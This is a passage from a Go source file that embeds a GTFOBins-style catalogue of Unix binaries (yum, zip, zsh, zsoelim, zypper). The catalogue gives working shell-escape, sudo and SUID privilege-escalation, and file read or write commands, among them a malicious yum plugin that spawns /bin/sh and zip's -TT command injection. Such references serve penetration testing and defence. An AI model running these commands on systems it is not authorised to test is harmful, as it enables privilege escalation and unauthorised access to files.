cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
`, "code"},
		},
	},
	"zip": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file-to-read
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`TF=$(mktemp -u)
./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
`, "code"},
		},
	},
	"zsh": map[string][]Functions{
		"file-read": []Functions{
			Functions{`export LFILE=file_to_read
zsh -c 'echo "$(<$LFILE)"'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
zsh -c 'echo DATA >$LFILE'
`, "code"},
		},
		"shell": []Functions{
			Functions{`zsh`, "code"},
		},
		"suid": []Functions{
			Functions{`./zsh`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo zsh`, "code"},
		},
	},
	"zsoelim": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./zsoelim "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo zsoelim "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
zsoelim "$LFILE"
`, "code"},
		},
	},
	"zypper": map[string][]Functions{
		"shell": []Functions{
			Functions{`This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.`, "description"},
			Functions{`zypper x
`, "code"},
			Functions{`TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
zypper x
`, "code"},
		},
		"sudo": []Functions{
			Functions{`This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.`, "description"},
			Functions{`sudo zypper x
`, "code"},
			Functions{`TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
sudo PATH=$TF:$PATH zypper x
`, "code"},
		},
	},
}
